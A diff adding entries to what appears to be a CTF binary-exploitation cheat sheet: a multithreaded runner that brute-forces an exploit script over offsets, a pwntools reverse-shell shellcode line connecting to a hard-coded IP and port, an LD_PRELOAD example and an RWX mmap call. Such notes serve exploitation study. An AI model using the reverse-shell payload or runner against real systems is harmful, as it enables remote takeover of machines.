@@ -10,6 +10,35 @@ Updating
 
 ## Start
 
+## multithread exp
+
+```python
+from threading import Thread
+from os import system
+from pwn import *
+def wrapper(i):
+	try:
+		for x in range(0x40):
+			if(x%0x10==i):
+				system("python ./eax.py {}".format(x))
+	except:
+		print("AP")
+tab= []
+for x in range(0x10):
+	tab.append(Thread(target= wrapper, args=(x,)))
+for x in range(0x10):
+	tab[x].start()
+while(1):
+	sleep(0x10)
+```
+
+## reverse shell - shellcode
+
+`shellcode = asm(shellcraft.connect('112.74.38.118',6999)+shellcraft.dupsh())`
+
+## LD_PRELOAD multi-lib
+`export LD_PRELOAD = "A.so b.so"`
+
 ## mmap
 `mmap(address,0x1000,0x7,0x22,0,0)`
 
